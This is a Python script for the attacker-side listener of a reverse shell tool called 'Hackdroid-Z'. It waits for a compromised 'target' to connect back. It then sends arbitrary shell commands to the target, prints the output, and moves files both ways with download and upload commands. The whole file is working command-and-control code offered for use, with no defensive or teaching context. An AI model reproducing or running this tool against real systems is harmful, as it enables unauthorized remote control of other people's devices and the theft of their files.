import socket
import json
import os
import optparse

target = None
ip =None

# colors
class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

    
# upload file 
def upload_file(file_name):
    f = open(file_name,'rb')
    target.send(f.read())


# download file
def download_file(file_name):
    f = open(file_name, "wb")
    target.settimeout(3)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def target_communication():
    while True:
        command = input(f"{colors.BOLD}{colors.OKGREEN}[{colors.ENDC}{colors.OKCYAN}shell{colors.ENDC}{colors.WARNING}({colors.ENDC}{ip[0]}{colors.BOLD}{colors.FAIL}:{colors.ENDC}{ip[1]}{colors.WARNING}){colors.ENDC}{colors.BOLD}{colors.OKGREEN}]{colors.ENDC}{colors.BOLD}{colors.FAIL}>{colors.ENDC} ")
        reliable_send(command)
        if command == "quit":
            break
        elif command[:3] == "cd ":
            pass
        elif command == "clear":
            os.system("clear")
        elif command[:8] == "download":
            download_file(command[9:])
        elif command[:6] == "upload":
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)

def main():
    parser = optparse.OptionParser('Usage of Program ' + '-H <your ip> -p <listening port>')
    parser.add_option('-H',dest='IP',type='string',help='Your IP')
    parser.add_option('-p',dest='listeningPort',type='string',help='Listening Port')
    (options, args) = parser.parse_args()
    IP = options.IP
    listeningPort = options.listeningPort

    if (IP == None) or (listeningPort == None):
        print(parser.usage)
        exit(0)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((str(IP), int(listeningPort)))

    print(f"    {colors.BOLD}{colors.FAIL}|{colors.ENDC} {colors.OKCYAN}{colors.BOLD}Hackdroid-Z{colors.ENDC}")
    print(f"    {colors.BOLD}{colors.FAIL}|{colors.ENDC} {colors.OKCYAN}Created By :{colors.ENDC} {colors.WARNING}BurpOverflow{colors.ENDC}")
    print(f"    {colors.BOLD}{colors.FAIL}|{colors.ENDC} {colors.OKCYAN}Twitter :{colors.ENDC} {colors.WARNING}@BurpOverflow{colors.ENDC}")
    print(f"{colors.BOLD}{colors.OKGREEN}[{colors.ENDC}{colors.BOLD}{colors.FAIL}+{colors.ENDC}{colors.BOLD}{colors.OKGREEN}]{colors.ENDC} {colors.WARNING}Listening For The Incomming Connections...{colors.ENDC}")

    sock.listen(5)
    global target
    global ip
    target, ip = sock.accept()
    print(f"{colors.BOLD}{colors.OKGREEN}[{colors.ENDC}{colors.BOLD}{colors.FAIL}+{colors.ENDC}{colors.BOLD}{colors.OKGREEN}]{colors.ENDC} Target Connected: {ip}")
    target_communication()

if __name__ == "__main__":
    main()